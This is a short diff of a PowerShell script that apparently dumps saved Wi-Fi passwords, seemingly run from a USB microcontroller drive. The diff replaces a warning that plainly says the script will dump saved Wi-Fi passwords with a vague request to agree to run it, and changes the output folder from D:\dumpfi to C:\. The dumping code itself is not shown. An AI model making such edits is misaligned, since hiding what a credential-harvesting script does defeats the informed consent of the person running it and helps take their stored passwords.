@@ -1,6 +1,6 @@
 Add-Type -AssemblyName System.Windows.Forms
 $result = [System.Windows.Forms.MessageBox]::Show(
-    'Warning: This will dump saved Wi-Fi passwords to the CIRCUITPY drive (D:). Continue?',
+    'Warning: You must agree that you are okay with running this script. You are welcome to read the content of the file.',
     'Warning',
     [System.Windows.Forms.MessageBoxButtons]::OKCancel,
     [System.Windows.Forms.MessageBoxIcon]::Warning
@@ -9,7 +9,7 @@ $result = [System.Windows.Forms.MessageBox]::Show(
 if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
     $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
     $pcname = $env:COMPUTERNAME
-    $folder = "D:\dumpfi"
+    $folder = "C:\"
     if (-not (Test-Path $folder)) {
         New-Item -Path $folder -ItemType Directory | Out-Null
     }
